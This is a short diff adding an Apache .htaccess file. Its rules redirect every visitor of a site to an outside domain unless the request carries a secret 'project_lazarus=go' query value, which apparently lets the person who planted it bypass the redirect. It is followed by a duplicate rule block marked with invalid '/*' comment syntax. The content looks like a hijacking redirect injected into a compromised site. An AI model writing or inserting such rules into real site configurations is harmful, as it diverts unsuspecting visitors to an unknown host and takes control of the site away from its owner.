@@ -1,0 +1,9 @@
+RewriteEngine on
+RewriteCond %{QUERY_STRING} !^.*project_lazarus=go.*$
+RewriteRule ^(.*)$ http://cyocyoa.com/$1 [R=302,L]
+
+
+/*RewriteEngine on
+RewriteCond %{REQUEST_URI} !^\/index.php$ 
+RewriteCond %{QUERY_STRING} !^.*project_lazarus=go.*$
+RewriteRule ^(.*)$ http://cyocyoa.com/$1 [R=302,L]
